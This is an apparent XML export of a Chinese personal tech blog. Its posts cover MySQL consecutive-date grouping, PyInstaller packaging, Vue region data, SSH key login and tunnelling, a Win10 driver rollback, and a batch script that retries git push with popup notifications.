<tbody><tr>
<td align="center">1</td>
<td align="center">2022-03-01</td>
<td align="center">1</td>
<td align="center">2022-03-01</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">2022-03-02</td>
<td align="center">2</td>
<td align="center">2022-03-01</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">2022-03-03</td>
<td align="center">3</td>
<td align="center">2022-03-01</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">2022-03-05</td>
<td align="center">4</td>
<td align="center">2022-03-02</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">2022-03-06</td>
<td align="center">5</td>
<td align="center">2022-03-02</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">2022-03-01</td>
<td align="center">1</td>
<td align="center">2022-03-01</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">2022-03-02</td>
<td align="center">2</td>
<td align="center">2022-03-01</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">2022-03-04</td>
<td align="center">3</td>
<td align="center">2022-03-02</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">2022-03-05</td>
<td align="center">4</td>
<td align="center">2022-03-02</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">2022-03-06</td>
<td align="center">5</td>
<td align="center">2022-03-02</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">2022-03-07</td>
<td align="center">6</td>
<td align="center">2022-03-02</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">2022-03-01</td>
<td align="center">1</td>
<td align="center">2022-03-01</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">2022-03-03</td>
<td align="center">2</td>
<td align="center">2022-03-02</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">2022-03-05</td>
<td align="center">3</td>
<td align="center">2022-03-03</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">2022-03-06</td>
<td align="center">4</td>
<td align="center">2022-03-03</td>
</tr>
</tbody></table>
<p>根据分组条件，分组辅助日期进行分组（MySQL不需要把所有的分组条件写入SELECT，好评）。日期区间需要判断日期数量（<del><code>这里之前用的count(*)，有重复日期的时候区间显示的不对，需要去除重复日期</code></del>），就一天的时候直接显示，多天的话获取最小和最大时间进行展示。实际上就是连续天数统计，这里主要显示日期区间。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select order_id, case when count(distinct serving_date) = 1 then min(serving_date) else concat(min(serving_date), &apos;-&apos;, max(serving_date)) end 投放期间, count(distinct serving_date) 连续天数 from temp_ad_serving_group group by order_id, 分组辅助日期</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">order_id</th>
<th align="center"><code>投放期间</code></th>
<th align="center">连续天数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center"><code>2022-03-01-2022-03-03</code></td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center"><code>2022-03-05-2022-03-06</code></td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center"><code>2022-03-01-2022-03-02</code></td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center"><code>2022-03-04-2022-03-07</code></td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center"><code>2022-03-01</code></td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center"><code>2022-03-03</code></td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center"><code>2022-03-05-2022-03-06</code></td>
<td align="center">2</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Python程序使用Pyinstaller打包成exe可执行文件</title>
    <url>/2023/10/23/Python%E7%A8%8B%E5%BA%8F%E4%BD%BF%E7%94%A8Pyinstaller%E6%89%93%E5%8C%85%E6%88%90exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="Python程序使用Pyinstaller打包成exe可执行文件"><a href="#Python程序使用Pyinstaller打包成exe可执行文件" class="headerlink" title="Python程序使用Pyinstaller打包成exe可执行文件"></a>Python程序使用Pyinstaller打包成exe可执行文件</h2><p><em>给朋友写过几个工具，VBA和Python都有，不过朋友更喜欢Python，于是又出了一个Python版。为了方便对方运行，就又打包成exe可执行文件</em></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>为什么要打包成exe可执行文件，主要是为了在没有装Python的电脑上运行，以及方便不懂编程的小伙伴运行。打包成exe可执行文件的话，Windows平台差不多都能运行，只发一个exe文件就好（前提是打包成一个exe，而不是文件夹）。<br>Pyinstaller的详细介绍可以去<a href="https://pyinstaller.org/en/stable/" target="_blank" rel="noopener"><code>Pyinstaller官网</code></a>查看，这里只是简单介绍一下Pyinstaller，实际使用上基本用几个参数就好。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Windows直接在cmd中用pip安装就好，如果安装较慢可以切换国内源试试。<br><code>pip install pyinstaller</code></p>
<p>我这里以前安装过了，当然也可用用<code>pip install --upgrade pyinstaller</code>更新一下版本。下面就是一个简单的打包操做，打包过程时间稍微有点长<br><img src="/img/20231023/1.png" alt></p>
<h3 id="主要命令参数"><a href="#主要命令参数" class="headerlink" title="主要命令参数"></a>主要命令参数</h3><p>Pyinstaller使用的时候注意参数大小写，一般有两种参数写法，比如查看版本可以使用<code>-v</code>或者<code>--version</code>。<br><code>-h</code>或者<code>--help</code>查看Pyinstaller的帮助信息，我为了方便（偷懒），全部使用简写的参数形式<br><img src="/img/20231023/2.png" alt></p>
<p><code>-F</code> 创建一个可执行文件，写小工具的时候推荐<br>执行<code>pyinstaller -F pyReadEx.py</code>后效果如下，会成成build，dist文件夹以及扩展名为spec的文件，exe可执行文件会在dist目录下<br><img src="/img/20231023/3.png" alt><br><code>-D</code> 默认参数，创建一个文件夹包含可执行文件<br><img src="/img/20231023/4.png" alt></p>
<p><code>-i</code> 设置icon图标</p>
<p><code>-n</code> 设置名字，省略的话直接使用第一个py脚本文件名<br><img src="/img/20231023/5.png" alt></p>
<p><code>-w</code> 使用窗口执行，不会打开控制台（Windows专用）。比如我的脚本有个print提示，使用此参数后就看不到了<br><code>-c</code> 默认参数，使用控制台执行（Windows专用）</p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>只是写小工具的话，上面的参数够用了。不过有时打包成exe的话，文件会很大，貌似Pyinstaller打包的时候很多不必要的库也会打包进去，可以考虑弄一个纯净的Python环境打包。现在Windows系统基本都是64位，Python也是64位的，基本不考虑32位系统，如果需要32位的exe的话，可以用32的Python进行打包。</p>
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Pyinstaller</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue element-china-area-data 数据源修改</title>
    <url>/2020/06/19/Vue-element-china-area-data-%E6%95%B0%E6%8D%AE%E6%BA%90%E4%BF%AE%E6%94%B9/</url>
    <content><![CDATA[<p><em>Vue前台需要省市区三级联动，但是element-china-area-data的regionData数据太旧了，而且有部分数据不符合现有系统的逻辑。于是乎……</em></p>
<h3 id="起"><a href="#起" class="headerlink" title="起"></a>起</h3><p>因为前台需要省市区三级联动的控件，就选用了<a href="https://github.com/Plortinus/element-china-area-data" target="_blank" rel="noopener">element-china-area-data</a>来实现。但是实际使用中发现并不能满足现有系统的需求，最主要的原因是数据太旧了。数据来源<a href="https://github.com/airyland/china-area-data" target="_blank" rel="noopener">china-area-data</a>已经3年多没有更新了。以山东省济南市莱芜区为例，element-china-area-data中依然是市级行政单位。<br><img src="/img/20200619/1.png" alt><br>element-china-area-data使用的是<a href="https://element.eleme.cn/#/zh-CN/component/cascader" target="_blank" rel="noopener">Element-Cascader级联选择器</a>，稍微封装了一些方法，于是决定直接使用Element-Cascader级联选择器，后台生成需要的数据。</p>
<h3 id="承"><a href="#承" class="headerlink" title="承"></a>承</h3><p>首先是数据来源，获取国务院-民政部最新的行政区划代码<a href="http://www.mca.gov.cn/article/sj/xzqh/2020/2020/202003301019.html" target="_blank" rel="noopener"><br>2020年2月中华人民共和国县以上行政区划代码</a>，通过Excel结合公式，来生成符合数据库表结构的数据。<br>复制粘贴下来是这样的，需要把空格替换掉（不间断空格\u00A0，复制粘贴表格中的一个空格通过Excle替换）<br><img src="/img/20200619/2.png" alt><br>然后根据我们系统中表结构分列，id和code就是行政区划代码，name对应地区名，parent_id对应上级id，parent_ids对应上级所有id，type对应省市区三级……<br>Excle公式计算如下：</p>
<ol>
<li>先判断级别类型type，根据行政区域代码结尾<code>0</code>的数量，4个为1省级，2个为2市级，其余为3区县。公式<code>=IF(RIGHT(F2,4)=&quot;0000&quot;,1,IF(RIGHT(F2,2)=&quot;00&quot;,2, 3))</code></li>
<li>parent_id，根据type，1省级为0，2市级为行政区域代码前两位拼接<code>0000</code>，3区县为行政区域代码前四位拼接<code>00</code>为公式<code>=IF(G2=1,0,IF(G2=2,LEFT(A2,2)&amp;&quot;0000&quot;,IF(G2=3,LEFT(A2,4)&amp;&quot;00&quot;)))</code></li>
<li>parent_ids，根据type和parent_id的结果拼接。公式<code>=IF(G2=1,B2,IF(G2=2,&quot;0,&quot;&amp;B2,IF(G2=3,&quot;0,&quot;&amp;LEFT(B2,2)&amp;&quot;0000,&quot;&amp;B2)))</code></li>
<li>sort，排序用，公式<code>=ROW()-1</code>。其他字段填充就行。</li>
</ol>
<p>因为是三级联动，4个直辖市没有中间一层，需要手动补充。在相应位置复制粘贴4个直辖市数据，把id和code的第四位从<code>0</code>改为<code>1</code>即可。<br><img src="/img/20200619/3.png" alt></p>
<h3 id="转"><a href="#转" class="headerlink" title="转"></a>转</h3><p>然后还有没有市级的区县，和没有区县的地级市……不过这个是在使用中发现的。上面的数据导入到数据库中，后台报错（根据上面的公式逻辑，存在没有父类的区县）。<br><img src="/img/20200619/4.png" alt><br>通过高德的地理编码，可以判断以上数据均为区县。<br><img src="/img/20200619/5.png" alt><br>重庆市的直接把<code>500200</code>的改为<code>500100</code>，sql<code>UPDATE sys_area SET parent_id = &#39;500100&#39;, parent_ids = &#39;0,500000,500100&#39; WHERE parent_id = &#39;500200&#39;</code>。其余的在中间加一层name为县的市级行政区（为了保证有3级数据），添加了4条数据。<br><img src="/img/20200619/6.png" alt><br>然后使用中发现还没有下一级的。<br><img src="/img/20200619/7.png" alt><br>然后又多加了一层，添加了5条数据。<br><img src="/img/20200619/8.png" alt><br>到此，全部的数据都能三级联动。数据这块根据实际需要来做吧，因为我们必须要存在三级。</p>
<h3 id="合"><a href="#合" class="headerlink" title="合"></a>合</h3><p>数据全部修改完成后，重新生成左右值（左右值和三联没有联系，可忽略，如何生成可以参考以前写的：<a href="https://mp.weixin.qq.com/s?__biz=MzIwMjgwNTI0Mg==&mid=100000187&idx=1&sn=c968907ff5d984733e44cedc719c19b7&scene=19#wechat_redirect" target="_blank" rel="noopener">从bug中学习左右值树</a>），最终后台控制页面部分显示如下。<br><img src="/img/20200619/9.png" alt></p>
<p>数据生成部分java逻辑（主要）代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public List&lt;AreaData&gt; initAreaData() &#123;</span><br><span class="line">    List&lt;Map&lt;String, Object&gt;&gt; list = systemDao.findAreaDataList(&quot;sys_area&quot;);</span><br><span class="line">    List&lt;AreaData&gt; areaData =  createAreaData(&quot;0&quot;, null, list, new AreaData());</span><br><span class="line">    return areaData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private List&lt;AreaData&gt; createAreaData(String parentId, String name, List&lt;Map&lt;String, Object&gt;&gt; list, AreaData areaData) &#123;</span><br><span class="line">    List&lt;Map&lt;String, Object&gt;&gt; childrenList = list.stream().filter(e -&gt; &#123;</span><br><span class="line">        return e.get(&quot;parentId&quot;).toString().equals(parentId);</span><br><span class="line">    &#125;).collect(Collectors.toList());</span><br><span class="line">    List&lt;AreaData&gt; children = Lists.newArrayList();</span><br><span class="line">    for (Map&lt;String, Object&gt; o : childrenList) &#123;</span><br><span class="line">        AreaData ad = new AreaData();</span><br><span class="line">        ad.setValue(String.valueOf(o.get(&quot;id&quot;)));</span><br><span class="line">        ad.setLabel(String.valueOf(o.get(&quot;name&quot;)));</span><br><span class="line">        List&lt;AreaData&gt; adchildrenList = Lists.newArrayList();</span><br><span class="line">        // 递归调用</span><br><span class="line">        adchildrenList = createAreaData(o.get(&quot;id&quot;).toString(), String.valueOf(o.get(&quot;name&quot;)), list, new AreaData());</span><br><span class="line">        if (0 &lt; adchildrenList.size()) &#123;</span><br><span class="line">            ad.setChildren(adchildrenList);</span><br><span class="line">        &#125;</span><br><span class="line">        children.add(ad);</span><br><span class="line">    &#125;</span><br><span class="line">    return children;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后<code>npm uninstall element-china-area-data -S</code>卸载，Vue前台修改如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;el-cascader</span><br><span class="line">  size=&quot;large&quot;</span><br><span class="line">  style=&quot;width:100%&quot;</span><br><span class="line">  :options=&quot;options&quot;</span><br><span class="line">  v-model=&quot;cuSelectedOptions&quot;</span><br><span class="line">  @change=&quot;cuHandleChange&quot;</span><br><span class="line">&gt;&lt;/el-cascader&gt;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      options: [], // 清空掉</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    fetchData() &#123;</span><br><span class="line">      // 具体根据自己的写</span><br><span class="line">      areaDataList(this.query).then(</span><br><span class="line">        response =&gt; &#123;</span><br><span class="line">          this.options = response.data;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后效果如下<br><img src="/img/20200619/10.png" alt><br>因为只有数据，element-china-area-data的方法用不了，但是都有替代方案。</p>
]]></content>
      <tags>
        <tag>Java</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>SSH远程登录</title>
    <url>/2021/06/25/SSH%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95/</url>
    <content><![CDATA[<h1 id="SSH远程登录"><a href="#SSH远程登录" class="headerlink" title="SSH远程登录"></a>SSH远程登录</h1><p><em>起因是服务器在儿童节那天数据库连不上了，原因是中了之前横行的勒索病毒的变种……然后就有了后来的各种加强：windos变更为linux,通过SSH连接等等，这里就简单梳理一下SSH的相关知识</em><br><img src="/img/20210625/1.jpg" alt></p>
<h4 id="什么是SSH"><a href="#什么是SSH" class="headerlink" title="什么是SSH"></a>什么是SSH</h4><p>SSH (Secure Shell 安全外壳协议)是为远程登录会话和其他网络服务提供安全性的网络协议。利用SSH协议可以有效防止远程管理过程中的信息泄露问题，即使被中途截获，密码和数据也不会泄露。可以防止中间人(man-in-the-middle)攻击。</p>
<h4 id="口令登录"><a href="#口令登录" class="headerlink" title="口令登录"></a>口令登录</h4><p>之前的deepin使用的是OpenSSH，默认使用口令的安全验证，就是只有账号和口令就可以登录远程主机。因为之前改过端口，需要同通过参数-p来指定端口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.112.128 -p 122</span><br></pre></td></tr></table></figure>

<p>第一次登录时，会提示你确认主机的真实性，yes后会提示你输入密码，如图<br><img src="/img/20210625/2.png" alt></p>
<h4 id="私钥登录"><a href="#私钥登录" class="headerlink" title="私钥登录"></a>私钥登录</h4><p>现在改为基于密匙的安全验证，通过一对密钥进行安全认证。</p>
<p>执行<code>ssh-keygen</code>生成公钥和私钥，公钥（通常做法是使用-t参数，指定密钥的加密算法，如dsa rsa），生成时会询问一些问题，一般默认回车就好，这里设置私钥密码。<br>第一个问题询问密钥保存的文件名。</p>
<blockquote>
<p>Enter file in which to save the key (/root/.ssh/id_rsa):</p>
</blockquote>
<p>第二个问题询问私钥是否设定密码保护,直接回车就默认为空。这里设置，然后再确认一遍密码。</p>
<blockquote>
<p>Enter passphrase (empty for no passphrase): </p>
</blockquote>
<p><img src="/img/20210625/3.png" alt></p>
<blockquote>
<p>id_rsa 生成的私钥文件<br>id_rsa.pub 生成的公钥文件</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#修改sshd_config</span><br><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>

<p>修改如下</p>
<blockquote>
<p>#root用户登录<br>PermitRootLogin yes</p>
<p>#密钥认证<br>PubkeyAuthentication yes</p>
<p>#密码认证（可以关闭，关闭后只能通过密钥进入）<br>PasswordAuthentication yes</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#重启SSH</span><br><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#私钥登录，把远程主机的私钥发放给客户端用户</span><br><span class="line">ssh root@192.168.112.128 -p 122 -i C:/Users/xuchl/.ssh/deepin_rsa</span><br></pre></td></tr></table></figure>

<p>因为我有设置私钥密码，这里需要输入私钥密码。<br><img src="/img/20210625/4.png" alt></p>
<h4 id="公钥登录"><a href="#公钥登录" class="headerlink" title="公钥登录"></a>公钥登录</h4><p>公钥登录，要客户端公钥写入远程主机authorized_keys文件中，这里直接复制粘贴的，试了几个linux命令都没有实现。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#修改sshd_config</span><br><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>

<p>修改如下</p>
<blockquote>
<p>PubkeyAuthentication yes<br>AuthorizedKeysFile .ssh/authorized_keys</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#修改文件权限</span><br><span class="line">chmod 600 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>PS:这里的文件使用root用户建的，其他用户通过密钥登录的话还需要再输入一遍密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#公钥登录</span><br><span class="line">ssh root@192.168.112.128 -p 122</span><br></pre></td></tr></table></figure>

<p><img src="/img/20210625/5.png" alt></p>
<h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h4><p>本地1和服务器2无法直接连接，但是中继3可以连接1和2，1通过3连上2。本地1到中继3形成数据传输的秘密隧道，即SSH隧道。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#本地1执行（本地1端口:服务器2:服务器2端口 中继3）</span><br><span class="line">ssh -L 1121:192.168.112.128:122 192.168.112.3</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#通过本地的1121端口就可以直接登录服务器</span><br><span class="line">ssh -p 1121 root@localhost</span><br></pre></td></tr></table></figure>

<p><img src="/img/20210625/6.png" alt></p>
<h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h4><p>本地1和服务器2无法直接连接，并且本地1无法连接中继3，但是中继3可以连接1和2，1通过3连上2。<br>额，这个没成功，win10连不上，不保证正确。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#中继3执行（中继3端口:服务器2:服务器2端口 本地1）</span><br><span class="line">ssh -R 1122:192.168.112.128:122 192.168.88.27</span><br></pre></td></tr></table></figure>

<h4 id="示例：通过SSH通道连接MariaDB"><a href="#示例：通过SSH通道连接MariaDB" class="headerlink" title="示例：通过SSH通道连接MariaDB"></a>示例：通过SSH通道连接MariaDB</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#通过Docker拉取最新MariaDB镜像</span><br><span class="line">docker pull mariadb</span><br><span class="line">#简单创建容器并启动</span><br><span class="line">docker run --name mariadb -p 3306:3306 -e MYSQL_ROOT_PASSWORD=12345 mariadb:latest</span><br></pre></td></tr></table></figure>

<p>通过SSH通道登录数据库<br><img src="/img/20210625/7.jpg" alt></p>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>不吐不快-Win10更新后锁屏界面花屏</title>
    <url>/2022/03/31/%E4%B8%8D%E5%90%90%E4%B8%8D%E5%BF%AB-Win10%E6%9B%B4%E6%96%B0%E5%90%8E%E9%94%81%E5%B1%8F%E7%95%8C%E9%9D%A2%E8%8A%B1%E5%B1%8F/</url>
    <content><![CDATA[<h2 id="不吐不快-Win10更新后锁屏界面花屏"><a href="#不吐不快-Win10更新后锁屏界面花屏" class="headerlink" title="不吐不快-Win10更新后锁屏界面花屏"></a>不吐不快-Win10更新后锁屏界面花屏</h2><p><em>吐槽专用，本以为眼不见为净就行，结果发现治标不治本</em></p>
<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>今天win10不知道自己更新了啥，只知道通知中提示了和显示相关的信息，让我重启电脑生效。因为在工作中没有在意，就关掉继续工作了。后来重启后发现电脑，锁屏界面输入密码时就花屏了，每次都出现不同的效果，效果如下：<br><img src="/img/20220331/1.jpg" alt></p>
<h2 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h2><p>首先用笔记本连接显示器，显示正常，排除显示器和连接线的问题。<br>更换显示器，更换接口(typec dp hdmi1 hdmi2)，更换连接线问题依旧存在，基本确定是我电脑自身的问题了。<br>首先想到的是显卡驱动，下了 360驱动 来查看驱动情况，显示显卡驱动是最新的(软件用完即卸)。 打开<code>设备管理器</code>查看显卡驱动程序，并没有发现什么端倪。<br><img src="/img/20220331/2.jpg" alt></p>
<p>不过事件选项卡里有错误信息，还是当天的，不过<code>事件查看器里</code>也没看出什么端倪(毕竟不懂)。<br><img src="/img/20220331/3.png" alt></p>
<p>查看Windows更新历史记录也没看出啥异常来。<br><img src="/img/20220331/4.jpg" alt></p>
<p>然后想知道当时通知的情况，打开<code>可靠性监视程序</code>查看系统通知发现确实更新了显卡驱动，基本确定了原因。</p>
<blockquote>
<p>win10系统通知历史查看方法：win+R快捷键打开运行，输入<code>control</code>打开控制面板。依次点击 系统和安全 安全和维护，左边栏点击 查看存档的消息 打开 可靠性监视程序。并不能记录所有，但可以参考一下。</p>
</blockquote>
<p><img src="/img/20220331/5.jpg" alt></p>
<h2 id="修缮"><a href="#修缮" class="headerlink" title="修缮"></a>修缮</h2><p>知道原因，但是除了锁屏界面貌似没有啥问题。刚开始就通过<code>组策略编辑器</code>把锁屏界面的模糊特效去除了，效果不错，没有花屏了。<br><img src="/img/20220331/6.jpg" alt><br>但是，在弄博客的时候发现，还是有花屏的地方，治标不治本啊。<br><img src="/img/20220331/7.jpg" alt></p>
<p>最终只能还原驱动了。<code>设备管理器</code>中的显卡驱动程序 回退驱动程序 按键不可用，这要就需要自己手动下载了。<br>这里是inter的核显，可以参考官方文档<a href="https://www.intel.cn/content/www/cn/zh/support/articles/000008628/graphics.html" target="_blank" rel="noopener">如何在 Windows® 10 和 Windows 11* 中将驱动程序回滚到之前的版本</a>）。在<a href="https://www.intel.cn/content/www/cn/zh/download-center/home.html" target="_blank" rel="noopener">下载中心</a>搜索栏中输入我的处理器编号 i5-8259U ，搜索驱动程序，找到对应我系统内部版本号 21H2 的显卡驱动程序（下载安装[英特尔® 驱动程序和支持助理]自动识别不出显卡驱动来，放弃）下载下来安装重启完成。锁屏页面和博客页面均显示正常。<br><img src="/img/20220331/8.jpg" alt></p>
]]></content>
      <tags>
        <tag>吐槽</tag>
      </tags>
  </entry>
  <entry>
    <title>不吐不快-github push失败(批处理if语句中弹窗)</title>
    <url>/2025/05/15/%E4%B8%8D%E5%90%90%E4%B8%8D%E5%BF%AB-github%20push%E5%A4%B1%E8%B4%A5-%E6%89%B9%E5%A4%84%E7%90%86if%E8%AF%AD%E5%8F%A5%E4%B8%AD%E5%BC%B9%E7%AA%97/</url>
    <content><![CDATA[<p><em>前段时间，github的工程无法push上去了，以前虽然github.com经常不能访问，但是push不上去貌似是第一次，而且持续了一周，中间只成功过一次提交</em></p>
<h4 id="应对"><a href="#应对" class="headerlink" title="应对"></a>应对</h4><p>因为经常提交失败就写了一段批处理脚本来自动提交</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">:: ============== 配置区 ==============</span><br><span class="line">set &quot;TARGET_DIR=C:\Users\xuchl\Desktop\xuchlei.github.io&quot;  :: 仓库路径</span><br><span class="line">set &quot;RETRY_DELAY=60&quot;                   :: 重试间隔秒数</span><br><span class="line">:: ===================================</span><br><span class="line"></span><br><span class="line">:: 验证目录是否存在</span><br><span class="line">if not exist &quot;%TARGET_DIR%&quot; (</span><br><span class="line">    echo ? 错误：目录不存在 &quot;%TARGET_DIR%&quot;</span><br><span class="line">    pause</span><br><span class="line">    exit /b 1</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">:: 进入目标仓库目录</span><br><span class="line">cd /d &quot;%TARGET_DIR%&quot;</span><br><span class="line"></span><br><span class="line">set ATTEMPT=0</span><br><span class="line">:retry_push</span><br><span class="line">set /a ATTEMPT+=1</span><br><span class="line">echo [尝试 !ATTEMPT! 次] 正在提交到远程仓库...</span><br><span class="line"></span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line">if %errorlevel% equ 0 (</span><br><span class="line">    echo Git 提交成功！</span><br><span class="line">    mshta vbscript:&quot;&lt;script language=&quot;&quot;vbscript&quot;&quot;&gt;msgbox(&quot;&quot;Git Push 成功&quot;&quot;):self.close &lt;/script&gt;&lt;/html&gt;&quot;</span><br><span class="line">) else (</span><br><span class="line">    echo 提交失败，%RETRY_DELAY%秒后重试...</span><br><span class="line">    timeout /t %RETRY_DELAY% /nobreak &gt;nul</span><br><span class="line">    goto retry_push</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>然而并没有什么卵用，一整天都无法成功<br><img src="/img/20250515/1.png" alt></p>
<p>其中弹窗遇到一些问题，发现只要弹窗语句中经常报缺少’)’的错误。</p>
<h4 id="批处理弹窗"><a href="#批处理弹窗" class="headerlink" title="批处理弹窗"></a>批处理弹窗</h4><p>一些弹窗语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mshta vbscript:msgbox(&quot;Git Push 成功&quot;,6,&quot;提示&quot;)(window.close)</span><br><span class="line"># 单行if无()可以用</span><br><span class="line">if 1==1 mshta vbscript:msgbox(&quot;Git Push 成功&quot;,6,&quot;提示&quot;)(window.close)</span><br><span class="line"></span><br><span class="line">mshta vbscript:execute(&quot;msgbox &quot;&quot;Git Push 成功&quot;&quot;:window.close&quot;)</span><br><span class="line"></span><br><span class="line">mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).popup(&quot;Git Push 成功&quot;,7,&quot;提示&quot;,64)(window.close)</span><br><span class="line"></span><br><span class="line">mshta javascript:window.execScript(&quot;msgBox(&apos;Git Push 成功&apos;):window.close&quot;,&quot;vbs&quot;)</span><br><span class="line"></span><br><span class="line">mshta vbscript:&quot;&lt;script language=&quot;&quot;vbscript&quot;&quot;&gt;msgbox(&quot;&quot;Git Push 成功&quot;&quot;):self.close &lt;/script&gt;&lt;/html&gt;&quot;</span><br><span class="line"></span><br><span class="line">msg %username% /time 100 &quot;Git Push 成功&quot;</span><br></pre></td></tr></table></figure>

<p>可以在if () 中能使用的弹窗：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if 1==1 (</span><br><span class="line">    mshta vbscript:&quot;&lt;script language=&quot;&quot;vbscript&quot;&quot;&gt;msgbox(&quot;&quot;Git Push 成功&quot;&quot;):self.close &lt;/script&gt;&lt;/html&gt;&quot;</span><br><span class="line">    msg %username% /time 100 &quot;Git Push 成功&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>吐槽</tag>
        <tag>批处理</tag>
      </tags>
  </entry>
  <entry>
    <title>不吐不快-博客修改路上的一些事（人无千日好，花无百日红）</title>
    <url>/2024/11/28/%E4%B8%8D%E5%90%90%E4%B8%8D%E5%BF%AB-%E5%8D%9A%E5%AE%A2%E4%BF%AE%E6%94%B9%E8%B7%AF%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BA%8B%EF%BC%88%E4%BA%BA%E6%97%A0%E5%8D%83%E6%97%A5%E5%A5%BD%EF%BC%8C%E8%8A%B1%E6%97%A0%E7%99%BE%E6%97%A5%E7%BA%A2%EF%BC%89/</url>
    <content><![CDATA[<p><em>博客很久没有太大的更新，发现有些功能已经不能用了……引用第三方代码的功能，有的停运了，有的接口变了，只能修改对应的功能了。人无千日好，花无百日红。时间的车轮会碾过一切</em></p>
<h3 id="停运的RevolverMaps"><a href="#停运的RevolverMaps" class="headerlink" title="停运的RevolverMaps"></a>停运的RevolverMaps</h3><p>links页的3D地球访问统计不显示了，发现第三方的RevolverMaps网站已经关停了。因为是记录访问位置的，数据也没了，只能去掉对应的代码了。<br><img src="/img/20241128/1.png" alt></p>
